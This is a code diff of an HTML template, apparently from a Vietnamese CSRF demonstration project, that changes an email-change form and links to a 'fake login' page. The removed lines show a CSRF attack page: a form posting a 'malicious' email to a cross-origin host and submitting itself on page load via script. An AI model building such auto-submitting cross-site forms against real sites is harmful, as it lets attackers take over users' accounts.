@@ -12,17 +12,19 @@
     </h2>
 
     <p>
-        <a href="fake-login">Fake Login</a>
+        <a href="/fake-login">Fake login</a>
     </p>
 
-    <form action="http://csrf-main.io/user/email"
+    <form action="/user/email"
         method="POST">
         @csrf
 
-        <label>Email mới:</label>
+        <label>
+            Email mới:
+        </label>
 
         <input name="email"
-            value="malicious-email@example.com" />
+            value="lockex1987@gmail.com" />
 
         <button type="submit">
             Đổi email
@@ -30,7 +32,7 @@
     </form>
 
     <script>
-        document.forms[0].submit();
+        // document.forms[0].submit();
 
         /*
         $.ajaxSetup({
